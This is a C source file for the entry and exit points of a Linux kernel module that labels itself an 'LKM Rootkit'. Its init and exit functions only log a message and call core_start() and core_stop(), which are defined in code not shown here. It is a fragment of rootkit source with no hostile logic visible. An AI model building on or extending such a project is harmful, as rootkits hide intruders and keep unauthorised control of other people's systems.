#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include "core.h"
#include "debug.h"

/**
 * @file init.c
 * 
 * @brief Initialization and cleanup functions for the LKM rootkit
 * 
 * This file contains the module initialization and cleanup functions for the
 * LKM rootkit. These functions are responsible for starting and stopping the
 * core functionality of the rootkit.
 */

// Define the license and other module information
MODULE_LICENSE("GPL");
MODULE_AUTHOR("");
MODULE_DESCRIPTION("LKM Rootkit 2600");
MODULE_VERSION("0.1.0");

/**
 * @brief Module initialization function
 * 
 * This function is called when the module is loaded into the kernel. It starts
 * the core functionality of the rootkit.
 * 
 * @return 0 on success, -1 on failure
 */
static int __init mod_init(void)
{
    RK_DEBUG("LKM rootkit loaded\n");

    core_start();
    return 0;
}

/**
 * @brief Module exit function
 * 
 * This function is called when the module is unloaded from the kernel. It
 * stops the core functionality of the rootkit.
 */
static void __exit mod_exit(void)
{
    core_stop();

    RK_DEBUG("LKM rootkit unloaded\n");
}

// Register the module initialization and exit functions
module_init(mod_init);
module_exit(mod_exit);
